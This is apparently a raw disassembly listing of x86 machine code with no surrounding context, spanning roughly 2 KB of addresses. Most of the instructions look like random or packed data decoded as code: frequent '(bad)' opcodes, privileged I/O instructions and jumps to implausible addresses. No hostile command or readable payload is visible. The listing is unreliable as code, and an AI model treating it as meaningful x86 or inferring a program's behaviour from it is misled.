  420a89:	fst    DWORD PTR [esi]
  420a8b:	iret   
  420a8c:	xor    ebp,eax
  420a8e:	lock mov esi,0x1f668b58
  420a94:	or     BYTE PTR [edi],al
  420a96:	mov    al,0xe1
  420a98:	cmp    cl,cl
  420a9a:	(bad)  
  420a9b:	call   0x7763813d
  420aa0:	adc    eax,0x1fc6d8f
  420aa5:	inc    esp
  420aa6:	adc    ch,dh
  420aa8:	add    edi,DWORD PTR [eax+ebx*8-0x70603fe]
  420aaf:	sbb    DWORD PTR [ecx+0x3d],edi
  420ab2:	xchg   esi,eax
  420ab3:	pop    ds
  420ab4:	xchg   edx,eax
  420ab5:	outs   dx,DWORD PTR ds:[esi]
  420ab6:	je     0x420aab
  420ab8:	in     al,dx
  420ab9:	out    dx,al
  420aba:	rol    edi,cl
  420abc:	mov    ds:0x62517a3f,al
  420ac1:	xchg   esi,eax
  420ac2:	inc    ebp
  420ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ac4:	mov    cl,0x92
  420ac6:	add    BYTE PTR [ecx-0x30e8c803],0xf8
  420acd:	out    dx,eax
  420ace:	addr16 jle 0x420a55
  420ad1:	(bad)  
  420ad3:	jg     0x420ae6
  420ad5:	xor    dh,dl
  420ad7:	mov    ch,0xe8
  420ad9:	mov    edi,0x43008ad9
  420ade:	std    
  420adf:	adc    bl,bh
  420ae1:	test   DWORD PTR [ebp-0x2a],0x42f12c4d
  420ae8:	push   esi
  420ae9:	add    al,0xfb
  420aeb:	or     BYTE PTR [edi+0x69987dab],0x1b
  420af2:	push   esi
  420af3:	jmp    0x420aae
  420af5:	cld    
  420af6:	and    eax,0xf27d0018
  420afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420afc:	and    al,0xce
  420afe:	pop    esi
  420aff:	adc    al,0xba
  420b01:	push   es
  420b02:	mov    dl,0xf9
  420b04:	in     al,0xa0
  420b06:	sub    DWORD PTR [ebp+0x56],esp
  420b09:	inc    esp
  420b0a:	add    al,0xfa
  420b0c:	sub    edx,eax
  420b0e:	ficomp WORD PTR ds:0x3e1f0911
  420b14:	inc    esi
  420b15:	add    DWORD PTR [ebx+esi*8],edi
  420b18:	cmc    
  420b19:	or     edx,DWORD PTR [esi]
  420b1b:	xor    eax,0x442529fc
  420b20:	sti    
  420b21:	pop    ds
  420b22:	or     cl,dh
  420b24:	mov    dl,0x4a
  420b26:	add    eax,0x831a8fec
  420b2b:	in     eax,dx
  420b2c:	add    eax,0x15ce9eb4
  420b31:	mov    ds:0xb9dd8922,al
  420b36:	ss mov dl,0xea
  420b39:	hlt    
  420b3a:	out    dx,eax
  420b3b:	push   0xc9189675
  420b40:	call   0x2d4f4b90
  420b45:	ds mov al,0x80
  420b48:	push   ebp
  420b49:	xchg   ecx,eax
  420b4a:	jns    0x420ba1
  420b4c:	loop   0x420bb7
  420b4e:	pop    ebp
  420b4f:	in     eax,dx
  420b50:	outs   dx,DWORD PTR ds:[esi]
  420b51:	shl    DWORD PTR [eax],1
  420b53:	pop    ebx
  420b54:	retf   
  420b55:	mov    al,ds:0xc17acf1f
  420b5a:	out    dx,al
  420b5b:	fistp  DWORD PTR [ecx-0x79]
  420b5e:	inc    eax
  420b5f:	push   ebp
  420b60:	lea    edx,[esi]
  420b62:	and    dh,0x53
  420b65:	xchg   edx,eax
  420b66:	js     0x420b8a
  420b68:	pop    esi
  420b69:	pop    esi
  420b6a:	jae    0x420b9d
  420b6c:	cmp    al,0x2b
  420b6e:	mov    esp,DWORD PTR [esi-0x2a]
  420b71:	fiadd  WORD PTR [edx+ecx*2+0x49f38835]
  420b78:	(bad)  
  420b79:	mov    dh,0x70
  420b7b:	stos   DWORD PTR es:[edi],eax
  420b7c:	sbb    ch,0x35
  420b7f:	xchg   DWORD PTR [esi],ecx
  420b81:	fnop   
  420b83:	mov    DWORD PTR ds:0x8e2d369a,esi
  420b89:	cwde   
  420b8a:	sub    edi,esp
  420b8c:	mov    ds:0xb3c76de1,eax
  420b91:	or     BYTE PTR [eax+0xe],dl
  420b94:	xor    ch,BYTE PTR [esi-0x57]
  420b97:	push   ss
  420b98:	loopne 0x420ba6
  420b9a:	nop
  420b9b:	jmp    0x420b7a
  420b9d:	adc    esp,DWORD PTR [edx-0x6499356b]
  420ba3:	sbb    al,0xac
  420ba5:	push   edi
  420ba6:	lds    edx,FWORD PTR [ebp-0x78]
  420ba9:	loope  0x420c14
  420bab:	cmp    DWORD PTR [eax+edx*2],ebp
  420bae:	lds    edx,FWORD PTR [esi]
  420bb0:	sbb    al,0x7e
  420bb2:	xchg   edi,eax
  420bb3:	sbb    DWORD PTR ds:0x78ee1935,esi
  420bb9:	sbb    al,0xfc
  420bbb:	rol    DWORD PTR [ecx],cl
  420bbd:	cmp    BYTE PTR ds:0xa50ec158,ch
  420bc3:	mov    ds:0x73214d27,al
  420bc8:	inc    esi
  420bc9:	int    0xca
  420bcb:	and    al,0x5c
  420bcd:	cld    
  420bce:	jno    0x420b5c
  420bd0:	addr16 imul edi,ecx,0xffffffef
  420bd4:	xchg   ebx,eax
  420bd5:	ins    DWORD PTR es:[edi],dx
  420bd6:	xchg   edi,eax
  420bd7:	mov    dh,0x4d
  420bd9:	pushf  
  420bda:	std    
  420bdb:	push   ebp
  420bdc:	xlat   BYTE PTR ds:[ebx]
  420bdd:	dec    esi
  420bde:	clc    
  420bdf:	sub    DWORD PTR [esi+0x290652c6],0x89d342fc
  420be9:	jae    0x420c22
  420beb:	test   BYTE PTR [edi-0x1cce24b4],al
  420bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bf2:	sbb    esi,DWORD PTR es:[eax-0x2fe400d4]
  420bf9:	xor    cl,BYTE PTR [edx-0x11]
  420bfc:	out    dx,eax
  420bfd:	rcr    BYTE PTR [ecx+0x37],cl
  420c00:	cmc    
  420c01:	outs   dx,BYTE PTR ds:[esi]
  420c02:	rol    eax,1
  420c04:	fcomp  QWORD PTR [edi-0x6c417dbe]
  420c0a:	or     ch,bl
  420c0c:	mov    ebx,0x63d4401
  420c11:	add    al,0x92
  420c13:	and    bh,bl
  420c15:	imul   ecx,DWORD PTR [esi],0x23c55c6d
  420c1b:	xchg   ebp,eax
  420c1c:	lods   eax,DWORD PTR ds:[esi]
  420c1d:	fild   WORD PTR [ecx]
  420c1f:	test   DWORD PTR ds:0x4313bb4f,eax
  420c25:	fist   DWORD PTR [edx-0xd]
  420c28:	mov    al,0x93
  420c2a:	fst    QWORD PTR [edi]
  420c2c:	or     ebx,DWORD PTR [eax-0x5e]
  420c2f:	cmc    
  420c30:	xchg   BYTE PTR [edi+0x45],al
  420c33:	scas   al,BYTE PTR es:[edi]
  420c34:	ror    DWORD PTR [edi+0x4d4805c5],0x38
  420c3b:	in     al,0xd2
  420c3d:	mov    esp,0x444be5ab
  420c42:	das    
  420c43:	and    DWORD PTR [ebp+0x51],esi
  420c46:	popa   
  420c47:	mov    eax,0x4c3e5198
  420c4d:	push   ecx
  420c4e:	pop    ebx
  420c4f:	pop    ebp
  420c50:	jb     0x420c25
  420c52:	pop    ds
  420c53:	lahf   
  420c54:	pop    esp
  420c55:	mov    cl,0xc
  420c57:	cmp    al,BYTE PTR [esi]
  420c59:	and    eax,0x98e7f6ec
  420c5e:	lds    eax,FWORD PTR [ebx]
  420c60:	std    
  420c61:	sub    BYTE PTR [esi],al
  420c63:	pop    esp
  420c64:	pop    eax
  420c65:	lea    esp,[esi-0x19c3a17a]
  420c6b:	xchg   ebp,eax
  420c6c:	mul    BYTE PTR [esi-0x52aa10f5]
  420c72:	push   ebx
  420c73:	pop    ss
  420c74:	or     BYTE PTR [esi],0xc0
  420c77:	mov    DWORD PTR [ebx+ebp*2],eax
  420c7a:	pop    esp
  420c7b:	loopne 0x420c69
  420c7d:	fcmovnbe st,st(3)
  420c7f:	data16 mov ds:0xe901a556,al
  420c85:	xchg   edx,eax
  420c86:	cdq    
  420c87:	fld    TBYTE PTR [ebp+0x16]
  420c8a:	mov    ebp,0xaababeba
  420c8f:	lods   al,BYTE PTR ds:[esi]
  420c90:	adc    ebx,DWORD PTR [ecx+0x72c2723f]
  420c96:	sub    BYTE PTR [ebx],al
  420c98:	fild   QWORD PTR ds:0xaccdd805
  420c9e:	test   eax,0x3ae7776d
  420ca3:	add    BYTE PTR [edx+0x10],0xb7
  420ca7:	add    eax,0xca06ccb7
  420cac:	jno    0x420cd3
  420cae:	and    bl,BYTE PTR [esi-0x3d]
  420cb1:	push   edx
  420cb2:	imul   BYTE PTR [ecx+0x377abe06]
  420cb8:	pop    es
  420cb9:	mov    ebx,0xee6cbe1f
  420cbe:	mov    ds:0xc9b57266,al
  420cc3:	jl     0x420cfe
  420cc5:	add    DWORD PTR [esi-0x4e189181],ecx
  420ccb:	sbb    al,0xdc
  420ccd:	and    al,0x74
  420ccf:	sbb    bh,dl
  420cd1:	imul   edi,ecx,0xffffffd5
  420cd4:	jae    0x420c5a
  420cd6:	xor    BYTE PTR [esi-0x4d],0xdd
  420cda:	xor    edi,ebp
  420cdc:	or     ch,BYTE PTR [ebp-0x5e2daf01]
  420ce2:	xchg   edx,eax
  420ce3:	sub    eax,ecx
  420ce5:	pop    ss
  420ce6:	sbb    bl,BYTE PTR [ebx+0x6a]
  420ce9:	sub    al,0xe7
  420ceb:	out    0x38,eax
  420ced:	mov    esp,0x29ef25ca
  420cf2:	aas    
  420cf3:	dec    esp
  420cf4:	cmc    
  420cf5:	inc    ebp
  420cf6:	test   BYTE PTR [esi-0x5],al
  420cf9:	sbb    bh,BYTE PTR [ebp-0x51597324]
  420cff:	out    0xf0,eax
  420d01:	daa    
  420d02:	sbb    BYTE PTR [eax+0x3fb258f3],dh
  420d08:	cmp    BYTE PTR [ebp+ebp*4+0x373a0f7f],bl
  420d0f:	mov    ah,0x8c
  420d11:	loopne 0x420d0c
  420d13:	imul   esp,DWORD PTR [eax],0xfa29a9c1
  420d19:	jbe    0x420cd9
  420d1b:	aad    0x13
  420d1d:	in     eax,0xf6
  420d1f:	sar    DWORD PTR [eax],0xd5
  420d22:	mov    ebp,0xff9c614f
  420d27:	aas    
  420d28:	scas   al,BYTE PTR es:[edi]
  420d29:	sbb    BYTE PTR [eiz*1-0x57b7f27f],dl
  420d30:	sbb    bl,BYTE PTR [eax-0x2c]
  420d33:	hlt    
  420d34:	or     dh,BYTE PTR [ebx-0x52]
  420d37:	into   
  420d38:	xchg   ebp,eax
  420d39:	xlat   BYTE PTR ds:[ebx]
  420d3a:	rol    BYTE PTR [ebx],1
  420d3c:	push   esp
  420d3d:	cmp    ah,0xeb
  420d40:	pop    esi
  420d41:	sbb    esp,ebx
  420d43:	(bad)  [edx+0x772275b4]
  420d49:	(bad)  
  420d4a:	lock mov bh,0x7a
  420d4d:	stos   DWORD PTR es:[edi],eax
  420d4e:	cld    
  420d4f:	js     0x420d00
  420d51:	ins    BYTE PTR es:[edi],dx
  420d52:	je     0x420d2c
  420d54:	mov    ah,dl
  420d56:	ja     0x420cf8
  420d58:	js     0x420d8e
  420d5a:	pop    esp
  420d5b:	or     DWORD PTR [ecx],edi
  420d5d:	mov    cl,0xd4
  420d5f:	leave  
  420d60:	mov    bh,0x32
  420d62:	and    eax,0xe07c1a99
  420d67:	mov    al,BYTE PTR [ecx+0x69701f09]
  420d6d:	sbb    BYTE PTR [edi],bl
  420d6f:	cpuid  
  420d71:	jl     0x420d0c
  420d73:	push   ebp
  420d74:	xchg   esp,eax
  420d75:	pop    ecx
  420d76:	mov    al,0xb9
  420d78:	lock inc esi
  420d7a:	scas   al,BYTE PTR es:[edi]
  420d7b:	push   eax
  420d7c:	(bad)  
  420d7d:	xor    esi,esp
  420d7f:	dec    ebp
  420d80:	or     BYTE PTR [ebx],dl
  420d82:	push   ds
  420d83:	pop    eax
  420d84:	pop    esp
  420d85:	adc    ch,BYTE PTR [esi-0x669208c9]
  420d8b:	js     0x420dc0
  420d8d:	stos   BYTE PTR es:[edi],al
  420d8e:	out    dx,al
  420d8f:	sti    
  420d90:	loope  0x420d13
  420d92:	pop    ss
  420d93:	ds or  eax,0x10cf5eda
  420d99:	test   eax,0xb9d5e898
  420d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d9f:	mov    ebp,DWORD PTR [edi+0xc8dddb9]
  420da5:	ror    edx,1
  420da7:	test   cl,al
  420da9:	or     DWORD PTR [esi+ecx*1-0x61],edx
  420dad:	jecxz  0x420d98
  420daf:	lock sbb BYTE PTR [edx],ah
  420db2:	add    BYTE PTR [edx+0x7b93e0ee],dl
  420db8:	push   ss
  420db9:	clc    
  420dba:	jg     0x420d8f
  420dbc:	sahf   
  420dbd:	test   al,0x19
  420dbf:	xor    al,0x56
  420dc1:	xchg   ebp,eax
  420dc2:	pop    esi
  420dc3:	loopne 0x420d6f
  420dc5:	fcom   QWORD PTR [edi+ecx*8+0x68]
  420dc9:	and    BYTE PTR [edi+0x4a],0x4e
  420dcd:	lock fldcw WORD PTR es:[edi+0x724aee23]
  420dd5:	js     0x420e07
  420dd7:	fdivr  QWORD PTR [eax]
  420dd9:	mov    ch,0xc3
  420ddb:	in     al,dx
  420ddc:	mov    ebx,0x956bf686
  420de1:	cmp    al,bh
  420de3:	rcl    BYTE PTR [edi-0x80],0x1
  420de7:	clc    
  420de8:	loope  0x420d8e
  420dea:	cmp    al,0x15
  420dec:	sahf   
  420ded:	and    eax,0x1e36e75d
  420df2:	xor    ah,dl
  420df4:	xchg   esp,eax
  420df5:	push   ebx
  420df6:	imul   ebx,DWORD PTR [esi+0x1b],0x1c
  420dfa:	cs jns 0x420e72
  420dfd:	test   eax,0x9d4bd705
  420e02:	dec    BYTE PTR [edi+0x5400a47a]
  420e08:	das    
  420e09:	or     DWORD PTR [ecx-0x1a67fbf5],edx
  420e0f:	mov    ebp,0x5ed365f
  420e14:	push   0x662cc883
  420e19:	mov    al,ds:0x5773d3bb
  420e1e:	rol    eax,cl
  420e20:	(bad)  
  420e21:	fiadd  WORD PTR [edx]
  420e23:	test   al,0x54
  420e25:	fcomp  DWORD PTR [ecx]
  420e27:	xchg   ecx,eax
  420e28:	adc    al,ah
  420e2a:	repz shl BYTE PTR fs:[ecx+0x1d],1
  420e2f:	pop    ecx
  420e30:	rol    BYTE PTR [ecx+esi*4-0xacdb9dd],1
  420e37:	out    dx,eax
  420e38:	aam    0x98
  420e3a:	mov    BYTE PTR [edi-0x66576856],dh
  420e40:	(bad)  
  420e42:	add    al,0xb6
  420e44:	fmul   QWORD PTR [edi+edi*2]
  420e47:	or     DWORD PTR [eax],eax
  420e49:	fild   QWORD PTR [eax+ecx*4-0x76b21d47]
  420e50:	ret    
  420e51:	cwde   
  420e52:	and    BYTE PTR [esi+0x461661a9],ah
  420e58:	xchg   ebx,eax
  420e59:	fbld   TBYTE PTR [edi+0x63]
  420e5c:	shufps xmm7,XMMWORD PTR [ebp-0x6c],0xf4
  420e61:	lea    edx,[esi+eax*1]
  420e64:	xchg   DWORD PTR [ebp+esi*8+0x61],ebp
  420e68:	jecxz  0x420eaf
  420e6a:	or     edx,DWORD PTR [ebp-0x16]
  420e6d:	cmp    al,0x39
  420e6f:	hlt    
  420e70:	xchg   ebx,eax
  420e71:	push   cs
  420e72:	dec    eax
  420e73:	lds    eax,FWORD PTR [esi+0x6a048ae3]
  420e79:	data16 (bad) 
  420e7b:	popa   
  420e7c:	sbb    al,0xc1
  420e7e:	pop    ecx
  420e7f:	fstp   TBYTE PTR [edi+0x66]
  420e82:	dec    edi
  420e83:	pop    ecx
  420e84:	(bad)  
  420e85:	sbb    al,bl
  420e87:	sub    esp,ebp
  420e89:	add    eax,0x44afe99
  420e8e:	sahf   
  420e8f:	mov    ch,BYTE PTR [ecx*4+0x76dce707]
  420e96:	fsubr  QWORD PTR [ebp-0x35]
  420e99:	imul   edx,DWORD PTR gs:[esi],0xfb65a4da
  420ea0:	sub    DWORD PTR ds:0xeff7babb,edi
  420ea6:	and    BYTE PTR [ebp+0x5a],ch
  420ea9:	imul   esp,edi,0x783471e7
  420eaf:	lea    edi,[esi+ebp*8]
  420eb2:	pop    eax
  420eb3:	data16 cld 
  420eb5:	push   0xffffffe9
  420eb7:	xchg   ebx,eax
  420eb8:	push   eax
  420eb9:	into   
  420eba:	push   cs
  420ebb:	int3   
  420ebc:	fcom   DWORD PTR ds:0xf42ead94
  420ec2:	scas   al,BYTE PTR es:[edi]
  420ec3:	popf   
  420ec4:	add    BYTE PTR [eax],al
  420ec6:	add    BYTE PTR [eax],al
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     ah,BYTE PTR [ebx-0x25738b6c]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	add    BYTE PTR [esi],0x0
  420ee1:	add    dl,ch
  420ee3:	xor    BYTE PTR [esp+ebx*1-0x4101934b],ah
  420eea:	mov    ds:0xb22ea87b,eax
  420eef:	jo     0x420e93
  420ef1:	sbb    al,0xa7
  420ef3:	mov    ebp,0xcffdb022
  420ef8:	jne    0x420f79
  420efa:	cs jne 0x420f4c
  420efd:	jo     0x420efd
  420eff:	add    eax,0xa746449e
  420f04:	fnstsw WORD PTR [esi]
  420f06:	push   ebp
  420f07:	out    dx,eax
  420f08:	inc    edi
  420f09:	test   DWORD PTR [eax],0xbef28074
  420f0f:	inc    ecx
  420f10:	clc    
  420f11:	test   al,0xaf
  420f13:	add    DWORD PTR [ebp+ecx*2+0x17],ebp
  420f17:	jmp    0xc33d404e
  420f1c:	out    dx,al
  420f1d:	add    al,0x5c
  420f1f:	(bad)  
  420f20:	test   DWORD PTR [ebp+ebx*2-0x6e9bb4c9],0x9718051
  420f2b:	call   0xb5a8ee44
  420f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f31:	push   ecx
  420f32:	pop    edi
  420f33:	jmp    0x420f70
  420f35:	pop    edi
  420f36:	sbb    al,0xc2
  420f38:	arpl   WORD PTR [ecx+0x607cfc20],dx
  420f3e:	pop    ebp
  420f3f:	daa    
  420f40:	jnp    0x420fbc
  420f42:	not    DWORD PTR [ecx+0x1a]
  420f45:	imul   edi,DWORD PTR [esp+esi*4-0x74f2501b],0x4ff13843
  420f50:	fistp  DWORD PTR [edx-0x59]
  420f53:	out    0x8d,al
  420f55:	sar    DWORD PTR ds:0xfec741eb,1
  420f5b:	inc    edi
  420f5c:	inc    eax
  420f5d:	xchg   ebp,eax
  420f5e:	jo     0x420f91
  420f60:	pop    ebx
  420f61:	cmp    BYTE PTR [edi],bh
  420f63:	mov    ecx,0x3affe5eb
  420f68:	not    DWORD PTR [ebx+0x32]
  420f6b:	gs push edi
  420f6d:	out    dx,al
  420f6e:	stc    
  420f6f:	rcl    DWORD PTR [esi],cl
  420f71:	scas   eax,DWORD PTR es:[edi]
  420f72:	inc    eax
  420f73:	hlt    
  420f74:	out    dx,al
  420f75:	mov    ch,0xf3
  420f77:	daa    
  420f78:	or     edi,DWORD PTR [ebx-0x2212be8]
  420f7e:	repnz stc 
  420f80:	dec    edi
  420f81:	shl    BYTE PTR [edx+0x21],0xc2
  420f85:	(bad)  [eax]
  420f87:	or     BYTE PTR [edx+0x31],dh
  420f8a:	lock xor BYTE PTR [edx],bh
  420f8d:	mov    ah,0xc3
  420f8f:	mov    DWORD PTR [edi-0x7fe78f59],ecx
  420f95:	stc    
  420f96:	add    BYTE PTR [edx+0x1f],bh
  420f99:	imul   ebp,DWORD PTR [edx+0xa],0xffffffc9
  420f9d:	mov    al,ds:0x1c7b4db1
  420fa2:	retf   0xa00d
  420fa5:	fld    DWORD PTR [ecx+0x32]
  420fa8:	and    al,0xe4
  420faa:	sub    eax,0x89f0edd4
  420faf:	jno    0x420ffb
  420fb1:	repz mov dl,0xb9
  420fb4:	dec    ebx
  420fb5:	fs mov ch,0xcf
  420fb8:	xchg   edi,eax
  420fb9:	cmp    dl,BYTE PTR [esi]
  420fbb:	or     eax,0xf90f6066
  420fc0:	scas   al,BYTE PTR es:[edi]
  420fc1:	xor    ebx,ebp
  420fc3:	repnz rcl DWORD PTR [eax],cl
  420fc6:	ins    BYTE PTR es:[edi],dx
  420fc7:	retf   0x2694
  420fca:	test   ax,0x53b2
  420fce:	hlt    
  420fcf:	cmp    BYTE PTR [esi],bh
  420fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fd2:	cmp    eax,0x4c2cffcb
  420fd7:	fwait
  420fd8:	cmp    edi,DWORD PTR [ecx]
  420fda:	pop    ecx
  420fdb:	mov    dh,0x8e
  420fdd:	mov    edi,cs
  420fdf:	push   ss
  420fe0:	in     eax,dx
  420fe1:	dec    ebx
  420fe2:	and    cl,dh
  420fe4:	cmp    edi,DWORD PTR [ebp-0x62]
  420fe7:	and    BYTE PTR [eax],ah
  420fe9:	sti    
  420fea:	mov    eax,0x99b91eff
  420fef:	les    ebp,FWORD PTR [eax+0x48]
  420ff2:	jnp    0x42103f
  420ff4:	or     BYTE PTR [eax+0x7cbc69a4],bl
  420ffa:	push   eax
  420ffb:	adc    eax,0x49580ecc
  421000:	mov    DWORD PTR [edi-0x2],eax
  421003:	lods   al,BYTE PTR ds:[esi]
  421004:	shr    BYTE PTR [edi-0x4e],cl
  421007:	and    DWORD PTR [eax+0x59],ebp
  42100a:	cmp    cl,BYTE PTR [ecx+edi*2-0x2097a9c8]
  421011:	adc    al,0x88
  421013:	push   eax
  421014:	and    eax,0xf3ae3f8
  421019:	add    al,0x5
  42101b:	cld    
  42101c:	stc    
  42101d:	loop   0x421041
  42101f:	out    dx,eax
  421020:	lds    esp,FWORD PTR [ebp+eiz*4+0x24]
  421024:	inc    esp
  421025:	not    BYTE PTR [eax]
  421027:	sbb    al,0xcc
  421029:	xlat   BYTE PTR ds:[ebx]
  42102a:	cmp    cl,al
  42102c:	dec    esi
  42102d:	fstp   TBYTE PTR [ebp-0x3bccd7f0]
  421033:	pop    ebx
  421034:	jne    0x42108c
  421036:	call   0xab06:0x72ee733
  42103d:	jecxz  0x421045
  42103f:	not    ebx
  421041:	out    dx,eax
  421042:	aad    0x61
  421044:	add    al,0x44
  421046:	test   dh,0x7e
  421049:	popa   
  42104a:	idiv   BYTE PTR [ebp+0x5b]
  42104d:	stos   DWORD PTR es:[edi],eax
  42104e:	lea    ebp,[ecx-0x6b]
  421051:	add    eax,0xefde9202
  421056:	fs pop eax
  421058:	cmp    al,0x8e
  42105a:	int    0xe
  42105c:	and    dl,al
  42105e:	sbb    BYTE PTR fs:[esi-0x7f8c5b33],cl
  421065:	es pop es
  421067:	jge    0x421058
  421069:	inc    esi
  42106a:	jge    0x42107c
  42106c:	pop    esp
  42106d:	jne    0x4210a3
  42106f:	inc    esi
  421070:	aam    0x8c
  421072:	and    DWORD PTR [esi],ecx
  421074:	int    0xca
  421076:	cdq    
  421077:	mov    edx,0x47acfd42
  42107c:	scas   eax,DWORD PTR es:[edi]
  42107d:	imul   DWORD PTR [ecx]
  42107f:	push   0x3a9b21e2
  421084:	cmp    DWORD PTR [edx],esi
  421086:	jge    0x4210c2
  421088:	dec    ebp
  421089:	push   es
  42108a:	cmp    BYTE PTR [ecx],0x60
  42108d:	mov    esi,0xe4eb1c37
  421092:	test   DWORD PTR [edx],ebp
  421094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421095:	pushf  
  421096:	add    al,0x63
  421098:	aam    0x33
  42109a:	aas    
  42109b:	imul   esp,DWORD PTR [esi+0x50],0x90657c83
  4210a2:	xchg   ebx,eax
  4210a3:	xor    al,0x2b
  4210a5:	xor    edx,DWORD PTR [esi-0x4e696db4]
  4210ab:	adc    BYTE PTR [ecx],cl
  4210ad:	addr16 mov esp,0xdbfd698d
  4210b3:	adc    DWORD PTR [ecx+edx*1+0x67],ebx
  4210b7:	and    DWORD PTR [ebx+0x4e40ba3d],esi
  4210bd:	test   al,0xb
  4210bf:	inc    edi
  4210c0:	mov    ecx,0xbe7de9c5
  4210c5:	mov    cl,0x5
  4210c7:	cmp    ebp,DWORD PTR [ebx]
  4210c9:	sbb    al,0xe1
  4210cb:	stc    
  4210cc:	imul   ebp,DWORD PTR [esi+0x2a],0xffffffb5
  4210d0:	repz mov ebp,DWORD PTR [edx]
  4210d3:	mov    dl,0x7e
  4210d5:	mov    cl,0xc5
  4210d7:	je     0x4210f6
  4210d9:	mov    esi,0x221d6a93
  4210de:	and    BYTE PTR [ecx-0x5238c71],al
  4210e4:	ror    dh,1
  4210e6:	xchg   edx,eax
  4210e7:	test   eax,0x9990ca62
  4210ec:	inc    ebp
  4210ed:	fisub  WORD PTR [ebx]
  4210ef:	aad    0x55
  4210f1:	sbb    bh,bh
  4210f3:	ins    BYTE PTR es:[edi],dx
  4210f4:	mov    esi,0xb25300f8
  4210f9:	mov    esi,0xa758955
  4210fe:	(bad)  
  4210ff:	cmp    edx,DWORD PTR [ebp-0x1c]
  421102:	mov    ecx,0x86a0fac2
  421107:	addr16 dec ecx
  421109:	adc    BYTE PTR [ebx],al
  42110b:	popf   
  42110c:	aaa    
  42110d:	fsub   DWORD PTR [edx+edx*4-0x26]
  421111:	pusha  
  421112:	jne    0x42118d
  421114:	retf   0x46e0
  421117:	es retf 0x5b04
  42111b:	pop    esp
  42111c:	aam    0xb4
  42111e:	and    edx,0xfffffff8
  421121:	(bad)  
  421122:	or     ecx,DWORD PTR [eax]
  421124:	dec    ebx
  421125:	or     DWORD PTR [esi+0x79],esp
  421128:	sub    ah,dh
  42112a:	jecxz  0x421114
  42112c:	pop    esi
  42112d:	pop    edx
  42112e:	xchg   ebx,eax
  42112f:	mov    edx,0x20390b97
  421134:	outs   dx,DWORD PTR ds:[esi]
  421135:	mov    dh,BYTE PTR [eax-0xf839948]
  42113b:	fwait
  42113c:	or     al,0x1c
  42113e:	cmp    eax,0xd50d0187
  421143:	or     DWORD PTR [ebx+0x41095c21],0xc5620c8a
  42114d:	pop    esp
  42114e:	call   0xa37fb281
  421153:	mov    ah,0x63
  421155:	adc    esp,DWORD PTR [ebp+0x486ee9f9]
  42115b:	add    eax,esp
  42115d:	mov    fs,ebx
  42115f:	jbe    0x42117c
  421161:	ret    
  421162:	mov    eax,0xd729765b
  421167:	sub    edx,ecx
  421169:	in     eax,0xf4
  42116b:	jl     0x4211c2
  42116d:	(bad)  
  42116e:	push   ecx
  42116f:	sahf   
  421170:	push   edi
  421171:	and    DWORD PTR [esi],esi
  421173:	sub    ebp,DWORD PTR [eax]
  421175:	mov    ah,al
  421177:	xchg   esp,eax
  421178:	and    BYTE PTR [ebx],bl
  42117a:	push   ss
  42117b:	outs   dx,DWORD PTR ds:[esi]
  42117c:	mov    ch,0xbc
  42117e:	jmp    0x1f4db61e
  421183:	dec    ebx
  421184:	fimul  DWORD PTR [ecx+0x56]
  421187:	sti    
  421188:	loop   0x421203
  42118a:	pop    ebx
  42118b:	mov    cl,0xe1
  42118d:	jo     0x421121
  42118f:	cli    
  421190:	lods   al,BYTE PTR ds:[esi]
  421191:	push   esi
  421192:	mov    WORD PTR es:[ebx],gs
  421195:	stc    
  421196:	aad    0xfc
  421198:	scas   al,BYTE PTR es:[edi]
  421199:	jmp    0x42114f
  42119b:	stos   DWORD PTR es:[edi],eax
  42119c:	je     0x4211b0
  42119e:	mov    eax,ds:0x6124dbb4
  4211a3:	test   eax,0x74118f54
  4211a8:	dec    edi
  4211a9:	or     dl,ch
  4211ab:	sbb    al,0x9f
  4211ad:	in     eax,dx
  4211ae:	popa   
  4211af:	fidiv  WORD PTR [ebx+0x11]
  4211b2:	data16 cmp ah,cl
  4211b5:	icebp  
  4211b6:	inc    edx
  4211b7:	js     0x421162
  4211b9:	fsub   DWORD PTR [esi-0x764b0eba]
  4211bf:	xchg   BYTE PTR fs:[edx+0x76b76191],al
  4211c6:	loopne 0x421185
  4211c8:	hlt    
  4211c9:	out    dx,eax
  4211ca:	in     al,0x29
  4211cc:	mov    BYTE PTR [esi-0xd9210d],ah
  4211d2:	outs   dx,DWORD PTR ds:[esi]
  4211d3:	out    0xa0,eax
  4211d5:	inc    ebx
  4211d6:	xchg   edx,eax
  4211d7:	sahf   
  4211d8:	ror    DWORD PTR [edx+0x5428155],1
  4211de:	mov    al,ds:0x1a672018
  4211e3:	mov    ebp,0xe582e39d
  4211e8:	int    0x3b
  4211ea:	arpl   WORD PTR [edi+esi*8],bp
  4211ed:	xor    esi,eax
  4211ef:	ss dec esp
  4211f1:	pop    ecx
  4211f2:	xor    BYTE PTR [ebp-0x76e377bf],bl
  4211f8:	repnz int3 
  4211fa:	(bad)  
  4211fb:	jg     0x42122e
  4211fd:	sbb    DWORD PTR [ebp-0x45cf6d28],ebp
  421203:	fnstcw WORD PTR [esi]
  421205:	cmp    al,0x22
  421207:	es push ebx
  421209:	inc    ebx
  42120a:	es mov bl,0xdf
  42120d:	mov    ebp,0x151a73c2
  421212:	dec    edx
  421213:	mov    BYTE PTR [eax-0x6d07ca77],bl
  421219:	mov    cl,0xe
  42121b:	sahf   
  42121c:	pmuludq mm0,mm0
  42121f:	(bad)  
  421221:	push   ds
  421222:	mov    edx,0x606925bb
  421227:	cmp    eax,0x9013117e
  42122c:	mov    al,0x67
  42122e:	xchg   edi,eax
  42122f:	xor    al,0x66
  421231:	and    al,dl
  421233:	ret    
  421234:	mov    ds:0x14ae85fd,al
  421239:	mov    esp,0x5668656c
  42123e:	imul   ebx
  421240:	inc    edx
  421241:	(bad)  
  421242:	mov    ch,0x4c
  421244:	sbb    al,0xe9
  421246:	std    
